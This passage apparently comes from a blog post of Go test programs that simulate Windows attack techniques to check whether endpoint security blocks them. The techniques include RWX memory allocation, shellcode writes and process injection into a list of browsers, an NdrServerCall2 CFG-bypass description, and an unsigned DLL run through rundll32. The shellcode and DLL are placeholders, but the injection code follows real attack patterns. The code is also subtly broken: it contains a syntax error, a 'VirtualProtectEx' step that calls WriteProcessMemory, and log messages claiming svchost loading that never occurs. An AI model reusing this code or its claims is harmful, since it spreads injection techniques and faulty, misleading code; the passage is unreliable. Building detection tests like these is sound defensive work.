</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to create script file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] VBS script file created&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execute VBS script with wscript.exe
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;wscript.exe&#34;</span>, scriptPath)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to execute script: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Script executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate .NET COM object creation and suspicious API call
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">simulateDotNetCOMObjectCreation</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">simulateDotNetCOMObjectCreation</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate the creation of a .NET COM object in an unexpected script interpreter
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Allocate executable memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	kernel32 <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">NewLazyDLL</span>(<span style="color:#f1fa8c">&#34;kernel32.dll&#34;</span>)
</span></span><span style="display:flex;"><span>	procVirtualAlloc <span style="color:#ff79c6">:=</span> kernel32.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;VirtualAlloc&#34;</span>)
</span></span><span style="display:flex;"><span>	addr, _, err <span style="color:#ff79c6">:=</span> procVirtualAlloc.<span style="color:#50fa7b">Call</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">4096</span>), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> addr <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] VirtualAlloc failed: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] VirtualAlloc executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Write shellcode to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	shellcode <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP instructions (for demonstration)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procWriteProcessMemory <span style="color:#ff79c6">:=</span> kernel32.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;WriteProcessMemory&#34;</span>)
</span></span><span style="display:flex;"><span>	processHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">GetCurrentProcess</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get current process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uintptr</span>
</span></span><span style="display:flex;"><span>	ret, _, err <span style="color:#ff79c6">:=</span> procWriteProcessMemory.<span style="color:#50fa7b">Call</span>(<span style="color:#8be9fd;font-style:italic">uintptr</span>(processHandle), addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>shellcode[<span style="color:#bd93f9">0</span>])), <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(shellcode)), <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>written)))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ret <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] WriteProcessMemory failed: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] WriteProcessMemory executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Remove the created script file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Remove</span>(scriptPath)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to remove script file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">103</span>) <span style="color:#6272a4">// Cleanup failed
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Script file removed&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="potential-browser-exploit-via-fake-rpc-messages">potential browser exploit via fake RPC messages</h2>
<p>this is an attack where specially crafted RPC (Remote Procedure Call) messages are sent to exploit vulnerabilities in web browsers. this can be used to bypass CFG (Control Flow Guard) mitigations, which prevent execution of arbitrary code.</p>
<p>the test first launches several common web browsers and allocates memory in their address spaces. it then writes shellcode to this memory and attempts to execute it via manipulated RPC calls.</p>
<p>it simulates the CFG bypass by exploiting a vulnerability in RPC message handling, specifically <code>NdrServerCall2</code>, which has been used in irl exploits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Potential Browser Exploit via Fake RPC Messages [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	browserProcesses <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;chrome.exe&#34;</span>, <span style="color:#f1fa8c">&#34;msedge.exe&#34;</span>, <span style="color:#f1fa8c">&#34;iexplore.exe&#34;</span>, <span style="color:#f1fa8c">&#34;brave.exe&#34;</span>, <span style="color:#f1fa8c">&#34;whale.exe&#34;</span>, <span style="color:#f1fa8c">&#34;browser.exe&#34;</span>, <span style="color:#f1fa8c">&#34;dragon.exe&#34;</span>, <span style="color:#f1fa8c">&#34;vivaldi.exe&#34;</span>, <span style="color:#f1fa8c">&#34;opera.exe&#34;</span>, <span style="color:#f1fa8c">&#34;seamonkey.exe&#34;</span>, <span style="color:#f1fa8c">&#34;safari.exe&#34;</span>, <span style="color:#f1fa8c">&#34;waterfox.exe&#34;</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, processName <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> browserProcesses {
</span></span><span style="display:flex;"><span>		cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(processName)
</span></span><span style="display:flex;"><span>		err <span style="color:#ff79c6">:=</span> cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to start process %s: %s&#34;</span>, processName, err))
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// memory manipulation with VirtualProtect + WriteProcessMemory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		procHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process.Pid))
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// allocate memory in target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		addr, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAllocEx</span>(procHandle, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// write shellcode to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		shellcode <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP sled as a placeholder
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>		err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(procHandle, addr, <span style="color:#ff79c6">&amp;</span>shellcode[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(shellcode)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// change memory protection to EXECUTABLE
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		oldProtect <span style="color:#ff79c6">:=</span> windows.PAGE_READWRITE
</span></span><span style="display:flex;"><span>		err = windows.<span style="color:#50fa7b">VirtualProtectEx</span>(procHandle, addr, <span style="color:#bd93f9">4096</span>, windows.PAGE_EXECUTE_READ, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to change memory protection: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// call NdrServerCall2
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// this component handles RPC requests + dispatches them to function pointers
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// has been exploited to bypass CFG
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// attacker replaced DOM vtable pointer with NdrServerCall2 -&gt; bypassing CFG check
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		_, err = syscall.<span style="color:#50fa7b">GetProcAddress</span>(windows.<span style="color:#50fa7b">NewLazyDLL</span>(<span style="color:#f1fa8c">&#34;rpcrt4.dll&#34;</span>).<span style="color:#50fa7b">Handle</span>(), <span style="color:#f1fa8c">&#34;NdrServerCall2&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to find NdrServerCall2: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Simulated RPC function call with memory manipulation&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Potential browser exploit via fake RPC messages executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="suspicious-api-from-an-unsigned-service-dll">suspicious API from an unsigned service DLL</h2>
<p>here, the attacker loads a malicious, unsigned DLL into a service process like <code>svchost.exe</code> (a critical system process), then uses that DLL to execute suspicious APIs. this is often used to maintain persistence or for privilege escalation.</p>
<p>the test creates an unsigned DLL and attempts to load it into <code>svchost.exe</code>. after loading the DLL, the test simulates suspicious API calls (<code>WriteProcessMemory</code>, <code>VirtualProtectEx</code>), which are usually used to modify the memory of other process or to change permissions on executable code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> serviceDLLPath = <span style="color:#f1fa8c">&#34;C:\\Windows\\Temp\\suspicious.dll&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Suspicious API from an Unsigned Service DLL [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// create new unsigned DLL
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllContent <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd;font-style:italic">byte</span>(<span style="color:#f1fa8c">&#34;test DLL file&#34;</span>)
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">WriteFile</span>(serviceDLLPath, dllContent, <span style="color:#bd93f9">0644</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to create DLL file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Unsigned DLL file created&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// load DLL into svchost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;rundll32.exe&#34;</span>, serviceDLLPath<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;,ServiceMain&#34;</span>)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to load DLL into svchost.exe: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] DLL loaded into svchost.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> time.Second)
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate suspicious API calls
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">simulateSuspiciousAPICalls</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">simulateSuspiciousAPICalls</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// WriteProcessMemory call
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> kernel32 = windows.<span style="color:#50fa7b">NewLazySystemDLL</span>(<span style="color:#f1fa8c">&#34;kernel32.dll&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> procWriteProcessMemory = kernel32.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;WriteProcessMemory&#34;</span>)
</span></span><span style="display:flex;"><span>	processHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>. <span style="color:#8be9fd;font-style:italic">uint32</span>(os.<span style="color:#50fa7b">Getpid</span>()))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to open process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	buffer <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd;font-style:italic">byte</span>(<span style="color:#f1fa8c">&#34;memorywrite&#34;</span>)
</span></span><span style="display:flex;"><span>	addr <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">0x00000001</span>)
</span></span><span style="display:flex;"><span>	ret, _, err <span style="color:#ff79c6">:=</span> procWriteProcessMemory.<span style="color:#50fa7b">Call</span>(<span style="color:#8be9fd;font-style:italic">uintptr</span>(processHandle), addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>buffer[<span style="color:#bd93f9">0</span>])), <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(buffer)), <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>written)))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ret <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] WriteProcessMemory failed: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] WriteProcessMemory executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate VirtualProtectEx call
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> oldProtect <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	addr = <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">0x00000001</span>)
</span></span><span style="display:flex;"><span>	size <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">1024</span>)
</span></span><span style="display:flex;"><span>	newProtect <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	ret, _, err = syscall.<span style="color:#50fa7b">Syscall6</span>(procWriteProcessMemory.<span style="color:#50fa7b">Addr</span>(), <span style="color:#bd93f9">5</span>, <span style="color:#8be9fd;font-style:italic">uintptr</span>(processHandle), addr, size, <span style="color:#8be9fd;font-style:italic">uintptr</span>(newProtect), <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>oldProtect)), <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ret <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] VirtualProtectEx failed: %s&#34;</span>, err))
